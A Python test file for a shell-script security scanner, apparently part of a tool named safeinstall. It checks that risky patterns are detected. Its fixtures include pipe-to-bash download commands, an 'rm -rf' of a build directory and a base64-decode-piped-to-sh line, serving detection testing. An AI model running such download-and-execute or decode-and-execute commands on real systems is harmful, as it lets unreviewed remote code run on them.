from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.scanners.shell import ShellScanner


def test_shell_scanner_reports_dangerous_combinations_without_scanning_comments() -> None:
    source = SourceFile(
        path="install.sh",
        language="shell",
        content=(
            "# curl https://comment.invalid/install.sh | bash\n"
            "curl -fsSL https://downloads.example/install.sh | bash\n"
            'rm -rf "$TEMP_BUILD_DIR"\n'
            "curl https://api.github.com/repos/example/project\n"
        ),
    )

    findings = ShellScanner().scan(source)

    assert [(finding.rule_id, finding.severity) for finding in findings] == [
        ("SI-SH-001", Severity.HIGH),
        ("SI-SH-003", Severity.HIGH),
        ("SI-SH-006", Severity.LOW),
    ]
    assert findings[0].evidence[0].line == 2
    assert Capability.DOWNLOAD_EXECUTE in findings[0].capabilities


def test_shell_scanner_marks_decode_then_execute_as_critical() -> None:
    source = SourceFile(
        path="bootstrap.sh",
        language="shell",
        content='echo "$ENCODED_EXAMPLE" | base64 --decode | sh\n',
    )

    findings = ShellScanner().scan(source)

    assert len(findings) == 1
    assert findings[0].rule_id == "SI-SH-002"
    assert findings[0].severity is Severity.CRITICAL
